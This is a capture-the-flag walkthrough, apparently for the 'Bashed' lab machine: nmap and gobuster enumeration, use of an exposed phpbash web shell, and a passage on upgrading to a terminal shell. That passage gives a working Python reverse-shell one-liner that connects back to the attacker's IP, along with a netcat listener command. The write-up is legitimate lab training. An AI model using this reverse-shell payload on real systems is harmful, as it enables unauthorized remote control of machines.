# Bashed      

![Bashed](./Screenshots/)

## Solution

### Scan with Nmap

Type:

```
nmap -sC -sV {target ip} -v
```

`-sC` - This flag tells Nmap to use the default set of scripts during the scan. These scripts are part of the Nmap Scripting Engine (NSE) and are used for tasks such as version detection, vulnerability detection, and more. Using -sC enhances the scan by providing additional information about the target.

`-sV` - Version detection. Nmap will try to determine the version of the services running on open ports. This is useful for identifying specific software and versions, which can help in assessing potential vulnerabilities.

`-v` - Enables verbose mode. Verbose mode provides more detailed output during the scanning process, allowing you to see more information about what Nmap is doing. This can be helpful for debugging and understanding the progress of the scan.

![nmap](./Screenshots/)

Here are the descriptions of the open port shown in the screenshot:

### **80/tcp (HTTP)**
The web server on this port is **Apache httpd 2.4.18** running on **Ubuntu**. It supports HTTP methods **GET**, **HEAD**, **POST**, and **OPTIONS**, providing a variety of options for client interactions. The HTTP title returned is **Arrexel's Development Site**, indicating a development-oriented webpage. The **Apache/2.4.18 (Ubuntu)** server header confirms the server type and version, which may be relevant when identifying any vulnerabilities specific to this version of Apache. Additionally, a unique favicon hash **MD5: 6AA5034A553DFA77C3B2C7B4C26CF870** suggests potential for fingerprinting or further analysis.

Http is open, so let's paste `http://{target ip}` into the browser.

![web](./Screenshots/bashedweb.png)

The site is very limited but we can easily access the only article - **phpbash**.

![web](./Screenshots/bashedweb2.png)

Let's join `https://github.com/Arrexel/phpbash` then.

![web](./Screenshots/bashedweb3.png)

My guess was that we have to transfer `phpbash.php` or `phpbash.min.php` to the server and then try to execute it.

I was thinking that maybe we could find `uploads` subdomain and then drop file there, so I used **Gobuster**. 

### Gobuster

I typed:

```
gobuster dir -u http://{target ip}/ -w {path to the dictionary}
```

![Gobuster](./Screenshots/bashedgobuster.png)

Interestingly, there was nothing in `/uploads`, but in the `/dev` section I found `phpbash.php` and `phpbash.min.php`.

![Gobuster](./Screenshots/bashedgobuster2.png)

Let's click on `phpbash.php`.

![Gobuster](./Screenshots/bashedgobuster3.png)

We have a shell.

![Gobuster](./Screenshots/bashedgobuster4.png)

### Get the user flag

The `user` flag is in the `/home/arrexel` directory.

![flag](./Screenshots/basheduserflag.png)

### Privilege escalation

Although **phpbash** shell is quite good, I prefer to have one in my terminal rather than in the web. Especially when I have to find out how to escalate privileges. The web one often freezes and you have to refresh, losing your progress.

![PE](./Screenshots/bashedpe.png)

**Python** is present, so we can create **Python** payload.

If you want to create `payload` quickly go to `https://www.revshells.com/` and select one of the Python ones(remember not to use Python3 ones).

I used **Python #2**:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{your tun0 ip}",{port of your choice}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

You can copy, and modify it.

### Netcat

Let's set up a **Netcat** listener.

```
nc -lvnp {port you have chosen}
```

![PE](./Screenshots/bashedpe2.png)

Now in the webshell paste your paylod.

In your **Netcat** tab you should have a shell.
